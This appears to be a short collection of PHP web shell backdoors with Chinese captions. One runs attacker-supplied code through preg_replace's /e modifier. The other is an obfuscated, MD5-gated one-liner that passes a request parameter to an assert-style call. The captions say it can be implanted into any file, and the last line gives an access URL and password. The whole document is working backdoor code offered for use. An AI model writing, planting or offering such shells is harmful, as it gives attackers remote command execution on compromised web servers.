<?php
if(isset($_POST['page'])) {
	$page = $_POST[page];
	preg_replace("/[errorpage]/e",$page,"saft");
	exit;
}
?>

 带md5并可植入任意文件

<?
md5($_GET['qid'])=='850abe17d6d33516c10c6269d899fd19'?array_map("asx73ert",(array)$_REQUEST['page']):next;
?>

shell.php?qid=zxexp  密码page